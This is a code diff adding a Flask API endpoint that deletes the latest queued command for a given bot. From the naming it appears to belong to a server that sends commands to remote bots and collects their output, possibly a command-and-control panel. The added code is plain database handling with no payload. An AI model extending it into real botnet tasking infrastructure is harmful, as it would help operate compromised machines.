@@ -157,3 +157,35 @@ def update_output_from_command(uuid):
 	finally:
 
 		return { "success": success_code }
+
+
+@bots.route("/api/bot/<uuid>/command", methods=["DELETE"])
+def delete_command(uuid):
+
+	success_code = 0
+
+	bot = Bot.query.get(uuid)
+
+	if not bot:
+
+		return { "success": 0 }
+
+	# Get last command
+
+	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
+
+	try: 
+
+		database.session.delete(cmd)
+
+		database.session.commit()
+
+		success_code = 1
+
+	except Exception:
+
+		database.session.rollback()
+
+	finally:
+
+		return { "success": success_code }
